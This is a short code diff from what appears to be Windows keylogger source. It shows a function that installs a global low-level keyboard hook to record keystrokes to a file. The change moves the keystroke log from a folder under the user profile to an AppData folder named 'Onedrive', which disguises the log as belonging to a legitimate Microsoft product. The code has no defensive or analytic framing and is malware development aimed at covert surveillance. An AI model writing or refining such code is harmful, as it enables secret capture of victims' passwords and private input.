@@ -377,8 +377,8 @@ DWORD WINAPI Keylogger_main(LPVOID lpParameter)
 {
     char tempPath[MAX_PATH] = {0};
     GetCurrentDirectoryA(MAX_PATH, tempPath);
-    const char *userProfilePath = std::getenv("USERPROFILE");
-    snprintf(location, MY_MAX_PATH, "%s\\ILU\\keylog.txt", userProfilePath);
+    const char *userProfilePath = std::getenv("APPDATA");
+    snprintf(location, MY_MAX_PATH, "%s\\Onedrive\\keylog.txt", userProfilePath);
     writeBOMIfNeeded(location);
     HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
     MSG msg;
